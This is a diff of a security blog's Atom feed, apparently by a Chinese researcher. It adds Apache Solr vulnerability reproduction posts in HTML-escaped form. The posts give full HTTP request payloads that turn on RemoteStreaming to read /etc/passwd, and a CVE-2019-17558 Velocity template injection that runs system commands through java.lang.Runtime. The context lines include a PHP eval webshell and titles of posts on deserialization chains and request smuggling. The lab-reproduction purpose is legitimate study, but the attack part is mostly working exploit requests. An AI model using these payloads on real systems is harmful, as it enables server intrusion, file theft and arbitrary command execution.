+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;GET /solr/admin/cores?_=1637649371526&amp;amp;show=schema&amp;amp;wt=json HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 192.168.8.128:8983&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept: application/json, text/plain, */*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://192.168.8.128:8983/solr/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;X-Requested-With: XMLHttpRequest&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DNT: 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;存在的 core 名为 demo&lt;br&gt;
+&lt;img src=&#34;../_resources/b07e466a79ac15b0597a2354b9a7f378.png&#34; alt=&#34;b07e466a79ac15b0597a2354b9a7f378.png&#34;&gt;&lt;br&gt;
+2. 修改 demo 的配置，开启 RemoteStreaming&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /solr/demo/config?_=1637649371526&amp;amp;show=schema&amp;amp;wt=json HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 192.168.8.128:8983&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept: application/json, text/plain, */*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://192.168.8.128:8983/solr/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;X-Requested-With: XMLHttpRequest&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DNT: 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;quot;set-property&amp;quot; : &amp;#123;&amp;quot;requestDispatcher.requestParsers.enableRemoteStreaming&amp;quot;:true&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;当出现以下信息时，表示漏洞可能存在:&lt;br&gt;
+This response format is experimental.  It is likely to change in the future&lt;br&gt;
+&lt;img src=&#34;../_resources/240c340be0b4a48321e3bfa01a8bdebd.png&#34; alt=&#34;240c340be0b4a48321e3bfa01a8bdebd.png&#34;&gt;&lt;br&gt;
+3. 读取敏感文件&lt;br&gt;
+数据包：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;GET /solr/demo/debug/dump?param=ContentStreams&amp;amp;stream.url=file:///etc/passwd HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 192.168.8.128:8983&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept: application/json, text/plain, */*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://192.168.8.128:8983/solr/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;X-Requested-With: XMLHttpRequest&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DNT: 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;读取成功&lt;br&gt;
+&lt;img src=&#34;../_resources/e6a8a0fa5ab5ce46c52d3877e991197b.png&#34; alt=&#34;e6a8a0fa5ab5ce46c52d3877e991197b.png&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;cve-2019-17558&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cve-2019-17558&#34;&gt;#&lt;/a&gt; CVE-2019-17558&lt;/h1&gt;
+&lt;h2 id=&#34;影响版本-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#影响版本-4&#34;&gt;#&lt;/a&gt; 影响版本&lt;/h2&gt;
+&lt;p&gt;5.0.0 &amp;lt;=Apache Solr&amp;lt;= 8.3.1&lt;/p&gt;
+&lt;h2 id=&#34;漏洞复现&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞复现&#34;&gt;#&lt;/a&gt; 漏洞复现&lt;/h2&gt;
+&lt;p&gt;用户可以注入自定义模板，通过 Velocity 模板语言执行任意命令&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;获取 core&lt;br&gt;
+ 当前存在的 core 为 demo&lt;br&gt;
+&lt;img src=&#34;../_resources/e88cbca22f51a1d4843dbf5dd4fa5339.png&#34; alt=&#34;e88cbca22f51a1d4843dbf5dd4fa5339.png&#34;&gt;&lt;/li&gt;
+&lt;li&gt;修改 demo 的配置，开启 params.resource.loader.enabled 配置&lt;br&gt;
+数据包：&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /solr/demo/config?_=1637649371526&amp;amp;show=schema&amp;amp;wt=json HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 192.168.8.128:8983&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept: application/json, text/plain, */*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://192.168.8.128:8983/solr/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;X-Requested-With: XMLHttpRequest&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DNT: 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 261&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type:application/json&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;quot;update-queryresponsewriter&amp;quot;: &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;startup&amp;quot;: &amp;quot;lazy&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;name&amp;quot;: &amp;quot;velocity&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;class&amp;quot;: &amp;quot;solr.VelocityResponseWriter&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;template.base.dir&amp;quot;: &amp;quot;&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;solr.resource.loader.enabled&amp;quot;: &amp;quot;true&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;params.resource.loader.enabled&amp;quot;: &amp;quot;true&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;../_resources/8f730000e51cf9135817b1b634c260f7.png&#34; alt=&#34;8f730000e51cf9135817b1b634c260f7.png&#34;&gt;&lt;br&gt;
+3. Velocity 模板代码注入&lt;br&gt;
+数据包：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;GET /solr/demo/select?q=1&amp;amp;&amp;amp;wt=velocity&amp;amp;v.template=custom&amp;amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 192.168.8.128:8983&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept: application/json, text/plain, */*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Referer: http://192.168.8.128:8983/solr/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;X-Requested-With: XMLHttpRequest&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DNT: 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;命令执行成功&lt;br&gt;
+&lt;img src=&#34;../_resources/f9466bd1a48ca275a93276b87fd78e46.png&#34; alt=&#34;f9466bd1a48ca275a93276b87fd78e46.png&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;传送门&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#传送门&#34;&gt;#&lt;/a&gt; 传送门：&lt;/h1&gt;
+&lt;p&gt;&lt;a href=&#34;https://zhuanlan.zhihu.com/p/374041499&#34;&gt;搜索引擎 Solr 介绍&lt;/a&gt;&lt;br&gt;
+&lt;a href=&#34;https://segmentfault.com/a/1190000013822385&#34;&gt; Lucene 就是这么简单&lt;/a&gt;&lt;br&gt;
+&lt;a href=&#34;https://blog.csdn.net/whatday/article/details/106974271&#34;&gt; cve-2017-12629 apache solr xxe &amp;amp; rce 漏洞分析&lt;/a&gt;（6）&lt;/p&gt;
+&lt;p&gt;Copyright ©milkii0&lt;/p&gt;
+</content>
+        <category term="solr, 漏洞复现" />
+        <updated>2022-06-10T01:10:46.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://example.com/2022/01/16/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E9%AA%8C%E8%AF%81%E6%B5%81%E7%A8%8B/</id>
         <title>redis未授权验证流程</title>
-        <link rel="alternate" href="http://example.com/2022/01/16/stjc/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E9%AA%8C%E8%AF%81%E6%B5%81%E7%A8%8B/"/>
+        <link rel="alternate" href="http://example.com/2022/01/16/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E9%AA%8C%E8%AF%81%E6%B5%81%E7%A8%8B/"/>
         <content type="html">&lt;h1 id=&#34;&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#&#34;&gt;#&lt;/a&gt; &lt;/h1&gt;
 </content>
         <category term="redis,未授权,漏洞利用" />
         <updated>2022-01-16T03:14:59.000Z</updated>
     </entry>
     <entry>
-        <id>http://example.com/2021/12/03/stjc/sourcemap%E6%B3%84%E9%9C%B2%E8%8E%B7%E5%8F%96%E5%89%8D%E7%AB%AF%E6%BA%90%E7%A0%81/</id>
+        <id>http://example.com/2021/12/03/sourcemap%E6%B3%84%E9%9C%B2%E8%8E%B7%E5%8F%96%E5%89%8D%E7%AB%AF%E6%BA%90%E7%A0%81/</id>
         <title>sourcemap泄露获取前端源码</title>
-        <link rel="alternate" href="http://example.com/2021/12/03/stjc/sourcemap%E6%B3%84%E9%9C%B2%E8%8E%B7%E5%8F%96%E5%89%8D%E7%AB%AF%E6%BA%90%E7%A0%81/"/>
+        <link rel="alternate" href="http://example.com/2021/12/03/sourcemap%E6%B3%84%E9%9C%B2%E8%8E%B7%E5%8F%96%E5%89%8D%E7%AB%AF%E6%BA%90%E7%A0%81/"/>
         <content type="html">&lt;p&gt;reverse-sourcemap 下载地址:&lt;a href=&#34;https://github.com/davidkevork/reverse-sourcemap&#34;&gt;https://github.com/davidkevork/reverse-sourcemap&lt;/a&gt;&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;
@@ -49,9 +173,9 @@
         <updated>2021-12-03T03:20:41.000Z</updated>
     </entry>
     <entry>
-        <id>http://example.com/2021/09/08/other/%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E8%AE%B0%E5%BD%95/</id>
+        <id>http://example.com/2021/09/08/%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E8%AE%B0%E5%BD%95/</id>
         <title>问题及解决记录</title>
-        <link rel="alternate" href="http://example.com/2021/09/08/other/%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E8%AE%B0%E5%BD%95/"/>
+        <link rel="alternate" href="http://example.com/2021/09/08/%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E8%AE%B0%E5%BD%95/"/>
         <content type="html">&lt;h1 id=&#34;java&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#java&#34;&gt;#&lt;/a&gt; Java&lt;/h1&gt;
 &lt;h2 id=&#34;debug调试报错&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#debug调试报错&#34;&gt;#&lt;/a&gt; debug，调试报错&lt;/h2&gt;
 &lt;p&gt;更换 jdk8 后无法 debug，可以 run&lt;/p&gt;
@@ -100,9 +224,9 @@
         <updated>2021-09-08T03:31:34.000Z</updated>
     </entry>
     <entry>
-        <id>http://example.com/2021/09/07/dmsj/ysoserial%E4%B9%8BCommonsCollections1%E8%B0%83%E8%AF%95/</id>
+        <id>http://example.com/2021/09/07/ysoserial%E4%B9%8BCommonsCollections1%E8%B0%83%E8%AF%95/</id>
         <title>ysoserial之CommonsCollections1调试</title>
-        <link rel="alternate" href="http://example.com/2021/09/07/dmsj/ysoserial%E4%B9%8BCommonsCollections1%E8%B0%83%E8%AF%95/"/>
+        <link rel="alternate" href="http://example.com/2021/09/07/ysoserial%E4%B9%8BCommonsCollections1%E8%B0%83%E8%AF%95/"/>
         <content type="html">&lt;h1 id=&#34;利用链简述&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用链简述&#34;&gt;#&lt;/a&gt; 利用链简述&lt;/h1&gt;
 &lt;ol&gt;
 &lt;li&gt;任意方法执行&lt;/li&gt;
@@ -248,9 +372,9 @@
         <updated>2021-09-07T02:12:48.000Z</updated>
     </entry>
     <entry>
-        <id>http://example.com/2021/08/25/dmsj/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/</id>
+        <id>http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/</id>
         <title>ysoserial之URLDNS调试</title>
-        <link rel="alternate" href="http://example.com/2021/08/25/dmsj/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/"/>
+        <link rel="alternate" href="http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/"/>
         <content type="html">&lt;h1 id=&#34;利用链简述&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用链简述&#34;&gt;#&lt;/a&gt; 利用链简述&lt;/h1&gt;
 &lt;ol&gt;
 &lt;li&gt;触发结果为一次 DNS 请求，适用目标无回显情况&lt;/li&gt;
@@ -423,9 +547,9 @@
         <updated>2021-08-25T03:38:45.000Z</updated>
     </entry>
     <entry>
-        <id>http://example.com/2021/08/12/stjc/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%95%B4%E7%90%86/</id>
+        <id>http://example.com/2021/08/12/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%95%B4%E7%90%86/</id>
         <title>一句话木马整理</title>
-        <link rel="alternate" href="http://example.com/2021/08/12/stjc/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%95%B4%E7%90%86/"/>
+        <link rel="alternate" href="http://example.com/2021/08/12/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%95%B4%E7%90%86/"/>
         <content type="html">&lt;h1 id=&#34;日常系列&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#日常系列&#34;&gt;#&lt;/a&gt; 日常系列&lt;/h1&gt;
 &lt;h2 id=&#34;phtml&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#phtml&#34;&gt;#&lt;/a&gt; phtml&lt;/h2&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script language=&amp;quot;php&amp;quot;&amp;gt;eval($_POST[&amp;#x27;milkii0&amp;#x27;]);&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
@@ -450,9 +574,9 @@
         <updated>2021-08-12T02:53:49.000Z</updated>
     </entry>
     <entry>
-        <id>http://example.com/2021/08/03/stjc/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</id>
+        <id>http://example.com/2021/08/03/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</id>
         <title>HTTP请求走私简述</title>
-        <link rel="alternate" href="http://example.com/2021/08/03/stjc/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
+        <link rel="alternate" href="http://example.com/2021/08/03/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
